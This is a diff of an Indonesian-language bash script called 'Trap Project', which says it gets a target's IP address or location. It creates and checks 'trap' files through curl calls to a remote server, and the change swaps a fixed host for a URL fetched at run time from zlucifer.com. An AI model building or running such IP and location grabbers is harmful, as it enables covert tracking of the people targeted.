@@ -12,8 +12,6 @@
 #///////////////////////////////////////////////////////////////////////////////
 echo Selamat datang kak, Siapa nick kaka? #tulisan keluar
 read nick #membaca yang ditulis
-
-
 echo "       ) _     _ "
 sleep 0.03
 echo "      ( (^)-~-(^) "
@@ -44,13 +42,9 @@ echo " mendapatkan IP atau lokasi Target"
 echo
 echo Selamat datang $nick ":)" Jones! :v
 echo 
-
-
 echo Apa kamu sudah membuat file trap?
 echo "y/n?"
 read confirm
-
-
 if [ $confirm = "y" ]; then
     echo "Masukan nama file yang sudah kamu buat"
     echo "Untuk melakukan pengecekan hasil"
@@ -63,12 +57,11 @@ while [ $i -le $max ]; do
     sleep 0.03
 if [ $i -eq 100 ]; then
     echo -ne " [complete!]\n"
-    curl -s http://simpan-gratis.000webhostapp.com/cek.php?input=$file #cek
+    get_url=$(curl -s http://zlucifer.com/api/trap.php)
+    curl -s $get_url/cek.php?input=$file #cek
 fi
     let i++
 done
-
-
 elif [ $confirm = "n" ]; then
     echo "Masukan nama file yang ingin kamu buat"
     read create
@@ -80,7 +73,8 @@ while [ $i -le $max ]; do
     sleep 0.03
 if [ $i -eq 100 ]; then
     echo -ne " [complete!]\n"
-    curl -s http://simpan-gratis.000webhostapp.com/trap.php?create=$create #create
+    get_url=$(curl -s http://zlucifer.com/api/trap.php)
+    curl -s $get_url/trap.php?create=$create #create
 fi
     let i++
 done    
@@ -92,11 +86,10 @@ if [ $cek_lagi = "y" ]; then
     echo "Untuk melakukan pengecekan hasil"
     read file
     echo "Melakukan Pengecekan"
-    curl -s http://simpan-gratis.000webhostapp.com/cek.php?input=$file #cek
+    curl -s $get_url/cek.php?input=$file #cek
 elif [ $cek_lagi = "n" ]; then
     echo "Terimakasih sudah menggunakan Trap Project :)"
 fi
-
 else 
 echo "Kesalahan"
 fi
